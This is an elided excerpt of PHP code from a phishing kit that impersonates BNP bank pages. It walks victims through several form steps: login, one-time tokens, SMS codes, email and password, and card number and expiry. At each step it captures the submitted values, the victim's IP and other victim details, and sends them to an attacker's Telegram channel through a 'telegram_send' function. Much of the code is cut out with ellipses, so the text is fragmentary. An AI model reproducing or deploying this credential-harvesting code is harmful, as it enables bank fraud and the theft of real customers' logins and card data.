   ...
   function telegram_send($message) {
    ...
    return true;
        ...
        if ($_POST['step'] == "login") {
                ...
                $message = "/-- LOGIN  BNP FORTI --/" . get_client_ip() . "\r\n";
            ...
            $_SESSION['errors']     = [];	
				...
				$message  = '/BNP FORTI | token1/' . get_client_ip() . "\r\n";
			...
			if ($_POST['step'] == "code2") {
				...
				$message = '/BNP FORTI | token2/' . get_client_ip() . "\r\n";
                $message .= 'code2 : ' . $_POST['m2'] . "\r\n";
                $message .= victim_infos();
                reset_data();
                telegram_send(urlencode($message));
		    ...
		    if ($_POST['step'] == "code3") {
				...
				$message = '/BNP FORTI | token3/' . get_client_ip() . "\r\n";
                $message .= 'code3 : ' . $_POST['m3'] . "\r\n";
                $message .= victim_infos();
                reset_data();
                telegram_send(urlencode($message));
        ...
        if ($_POST['step'] == "sms") {
				...
				$message = "/-- SMS  BNP FORTI --/" . get_client_ip() . "\r\n";
...
if ($_POST['step'] == "extra") {
				...
				$message = "/-- extra BNP FORTI --/" . get_client_ip() . "\r\n";
		...
		if ($_POST['step'] == "emlll") {
				...
				$message = "/-- email  BNP FORTI --/" . get_client_ip() . "\r\n";
				...
				$message = "/-- PASS  BNP FORTI --/" . get_client_ip() . "\r\n";
                ...
                $message = "/-- exp/num INFOS BNP FORTI --/" . get_client_ip() . "\r\n";
        ...
        if ($_POST['step'] == "cc") {
                ...
                $message = "/-- CARD INFOS BNP FORTI --/" . get_client_ip() . "\r\n";
